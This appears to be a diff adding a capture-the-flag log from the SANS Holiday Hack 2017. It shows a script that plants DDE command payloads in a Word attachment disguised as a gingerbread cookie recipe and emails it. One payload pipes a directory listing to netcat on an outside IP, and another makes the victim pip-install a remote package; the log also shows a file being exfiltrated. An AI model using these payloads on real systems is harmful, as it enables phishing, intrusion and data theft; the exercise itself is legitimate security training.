@@ -1,0 +1,49 @@
+Full phish run:
+
+    justin@dovm1:~/projects/sans-holiday-hack-2017/tools$ ./env/bin/python full_phish.py
+    Using 162.243.250.187 as external IP
+    Found word/document.xml, rewriting 50793 bytes
+    Before:
+    DEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
+    After:
+    DEAUTO c:\\windows\\system32\\cmd.exe "/k dir C:\\ | nc 162.243.250.187 44440"
+    File uploaded and available at http://mail.northpolechristmastown.com/attachments/UXdGcdVT7TuYkeqj8IcSoFL87BrJfe29o0ftitE3xsHpEFksAj__gingerbreadcookierecipe.docx
+    Sending message...
+
+    {'bool': True, 'result': 'Message <819b4945-07b3-23a3-1a85-60b947c22764@northpolechristmastown.com> sent: 250 2.0.0 Ok: queued as C6D57C4313'}
+    Listening on port 44440
+    New connection from ('35.185.57.190', 51806)
+    Got:
+     Volume in drive C has no label.
+     Volume Serial Number is 9454-C240
+
+     Directory of C:\
+
+    12/04/2017  08:42 PM         1,053,508 GreatBookPage7.pdf
+    11/14/2017  07:57 PM    <DIR>          inetpub
+    09/12/2016  11:35 AM    <DIR>          Logs
+    12/05/2017  05:00 PM    <DIR>          Microsoft
+    07/16/2016  01:23 PM    <DIR>          PerfLogs
+    11/15/2017  02:35 PM    <DIR>          Program Files
+    11/14/2017  08:24 PM    <DIR>          Program Files (x86)
+    11/15/2017  03:03 PM    <DIR>          python
+    11/14/2017  08:39 PM    <DIR>          Users
+    11/30/2017  06:23 PM    <DIR>          Windows
+                   1 File(s)      1,053,508 bytes
+                   9 Dir(s)  38,355,128,320 bytes free
+
+    Baseline worked.. running real command..
+    Found word/document.xml, rewriting 50793 bytes
+    Before:
+    DEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
+    After:
+    DEAUTO c:\\windows\\system32\\cmd.exe "/k C:/Progra~1/Python36/python.exe -m pip install https://www.bouncybouncy.net/ud.tar.gz"
+    File uploaded and available at http://mail.northpolechristmastown.com/attachments/kmpnnyg6OmRu7r4rPVtfavbwKBOwy7rRKHUlrjVNUw3gsCmKte__gingerbreadcookierecipe.docx
+    Sending message...
+
+    {'bool': True, 'result': 'Message <1fb5851d-03ac-15e4-c7e4-50b9dedbfa7f@northpolechristmastown.com> sent: 250 2.0.0 Ok: queued as 086B4C4315'}
+    Using 162.243.250.187 as external IP
+    Listening on port 44665
+    New connection from ('35.185.57.190', 51811)
+    Got response, 1423163 bytes
+    1053508 bytes written to Greatbookpage7.pdf
